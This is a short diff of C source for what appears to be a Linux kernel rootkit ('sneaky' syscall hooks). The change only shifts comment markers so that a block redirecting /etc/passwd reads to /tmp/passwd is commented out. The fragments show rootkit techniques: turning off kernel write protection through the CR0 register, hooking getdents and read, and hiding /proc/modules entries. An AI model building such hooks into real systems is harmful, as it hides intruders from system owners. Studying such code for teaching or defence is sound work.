@@ -55,7 +55,7 @@ write_cr0 (read_cr0 () & (~ 0x10000));
     
 
     
-write_cr0 (read_cr0 () | 0x10000);/*
+write_cr0 (read_cr0 () | 0x10000);*/
 
 //These are function pointers to the system calls that change page
 //permissions for the given address (page) to read-only or read-write.
@@ -119,6 +119,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 
 //3. open the saved “/tmp/passwd” when a request to open the “/etc/passwd”
 //a flag that indicates whether /proc/modules is open; if open, flag = fd
+/*
 static int flag = -1;
 #define ORI_PASSWD_FILE "/etc/passwd"
 #define TMP_PASSWD_FILE "/tmp/passwd"
@@ -191,7 +192,7 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count)
     {
         return original_read(fd, buf, count);
     }
-}
+}*/
 
 /*
 *
